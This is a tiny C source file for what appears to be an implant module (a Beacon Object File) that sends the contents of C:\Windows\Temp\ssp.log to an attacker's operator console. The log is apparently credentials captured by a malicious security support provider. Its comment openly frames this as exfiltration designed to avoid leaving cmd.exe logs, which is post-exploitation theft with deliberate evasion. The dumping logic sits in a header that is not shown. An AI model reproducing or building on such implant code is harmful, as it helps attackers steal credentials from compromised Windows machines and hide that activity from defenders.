// ssp_log.c — dump C:\Windows\Temp\ssp.log to the operator console (evidence
// exfil without touching cmd.exe logs). Capped at 64 KiB per dump. No args.
#include "ssp_bof.h"

DECLSPEC_EXPORT void go(char* args, int len)
{
    (void)args; (void)len;
    SSP_DumpLog();
}
